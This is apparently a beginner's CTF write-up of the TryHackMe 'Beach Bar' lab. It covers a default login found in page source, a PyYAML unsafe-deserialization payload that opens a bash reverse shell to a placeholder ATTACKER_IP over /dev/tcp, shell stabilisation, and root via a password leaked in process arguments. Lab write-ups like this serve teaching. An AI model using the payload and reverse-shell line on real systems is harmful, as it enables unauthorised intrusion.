# Day 05
- **Challenge name:** [Beach Bar](https://tryhackme.com/room/hh-beachbar-d849f7f7)
- **Category:** Boot2Root / Pentesting
- **Difficulty:** Easy (personal opinion - not so easy for complete beginners, if you have any prior knowledge on pentesting I guess it's of the easier kind)
- **Date completed:** 31st of July 2026

> Shoutout to **Djalil Ayed** - his video walkthrough and writeup helped me a lot with this room. Links at the bottom.

## Summary
Quick heads up: this was my first ever pentesting room, and I went in knowing almost nothing about pentesting. So this took me a lot longer than it might look on paper.

In this challenge you're a guest at the Byte Lotus beach bar, where there's a DJ jukebox web app that takes song requests from anyone with a phone. The person who built it left more than just music behind - a login page with a secret still turned on, and a playlist feature that trusts your input a bit too much. Getting in means spotting something that shouldn't still be there. Getting all the way to root means spotting something a running process says out loud that it really shouldn't.

## Exploitation / Walkthrough
### Step 1
I got the Lab Machine's IP address from the room, copied it, and pasted it straight into my browser's address bar. That opened up a login page for "Beach Bar // Sign in", a web app running on port 80.

I also ran an nmap scan on the target and saw only two open ports - SSH, and the web app on port 80 (running gunicorn). With such a small attack surface, the web app was the way in.

### Step 2
I checked the page source of the login page (right-click > View Page Source) and found a comment the developer forgot to remove:

> *staff note: the demo DJ login is still enabled for the soft opening.*
> *dj / dj -- swap this before the season starts (ticket BAR-7)*

I logged in with `dj` / `dj` and landed on a DJ dashboard for "tonight's set."

### Step 3
The dashboard had two playlist buttons - Export and Import - for bringing a set from another night as a YAML file. I hit Export first to see what the format looked like:

```yaml
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

A feature that takes raw YAML from a logged-in guest is exactly the kind of thing worth testing for a code execution bug.

### Step 4
I opened a listener on my attack machine:

```bash
nc -lvnp 4444
```

Then I typed this into the Import box on the website:

> ```yaml
> playlist:
>   name: !!python/object/apply:subprocess.check_output [["bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]]
>   tracks: []
> ```

Turns out the app was loading playlists with PyYAML's unsafe loader instead of the safe one, so that YAML tag was enough to run a command on the server. I got a reverse shell back as the user `bartender`.

### Step 5
My shell was a bit broken at first (no arrow keys, no tab, weird line jumps), so I fixed it with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
Then I looked in the home directory for the flag:

```bash
ls -la
cat user.txt
```

And found the user flag.

### Step 6
Root took a lot more digging, and I'll be honest, I didn't figure this one out on my own. A comment on Djalil's LinkedIn post about this room, from **Marjan Sterjev**, pointed me toward checking the running processes:

> ```bash
> ps aux | grep python
> ```

Here's what to actually look for: **ps aux** lists every running process, and the last column **(COMMAND)** shows the full command that started it - including any arguments passed to it. Most of the time this is boring (just a script name). But some scripts get run with flags like --password=something or similar, and those show up in plain text in that same column.

Scanning through the output, one of the python processes had exactly that - a flag in its command line with a password spelled out. That password turned out to be the sudo password for root, visible to anyone on the box who ran ps aux.

### Step 7
With that password, I ran:

> ```bash
> su root
> ```

typed in the password, and got a root shell. The second flag was sitting at `/root/root.txt`.

And voilà, there you have it!

## Flag
![redacted](https://img.shields.io/badge/-REDACTED-000000) - to avoid spoilers, correct flag will be posted after the event is concluded.

## Lessons Learned
Two lessons here. First, always check the page source - leftover comments and demo passwords are a real, common way in. Second, if a password is typed as part of a command, anyone on the machine can see it just by running `ps aux` - so passwords should never be passed that way, they belong in a config file or environment variable instead.

## Sources
- Video walkthrough: https://www.youtube.com/watch?v=GMBbSoBAVEw
- Writeup reference / credit: **Djalil Ayed** - https://github.com/djalilayed/tryhackme/tree/main/beach_bar
- Root privesc tip courtesy of **Marjan Sterjev**, via a comment on Djalil's LinkedIn post about this room - https://www.linkedin.com/feed/update/urn:li:activity:7489011315101831168/
